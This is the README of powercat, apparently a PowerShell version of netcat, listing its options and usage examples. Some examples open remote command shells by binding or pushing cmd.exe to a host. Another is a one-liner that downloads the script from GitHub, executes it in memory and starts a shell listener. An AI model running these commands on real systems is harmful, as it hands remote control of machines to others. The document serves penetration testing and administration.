#powercat

Netcat: The powershell version. (v2 compatible)

### Parameters:
    -l    Listen for a connection.                    [Switch]
    -c    Connect to a listener.                      [String]
    -p    The port to connect to, or listen on.       [String]
    -e    GAPING_SECURITY_HOLE                        [String]
    -t    Timeout option. Default: 60                 [int32]
### Usage Examples:
    Listen and Connect:
        powercat -l 443
        powercat -c 10.1.1.10 443
    Serve and Shove Shells:
        powercat -l -e cmd.exe 443
        powercat -c 10.1.1.10 -e cmd.exe 443
    Redirect Output to a file:
        powershell -c '. .\powercat.ps1; powercat -l 443' > C:\outputfile
    Download and Execute Powercat Listener:
        IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l 8000 -e cmd.exe
### Stuff that Doesn't Work (Yet):
    Accepting pipeline input. (cat infile | powercat -c 10.1.1.1 443)
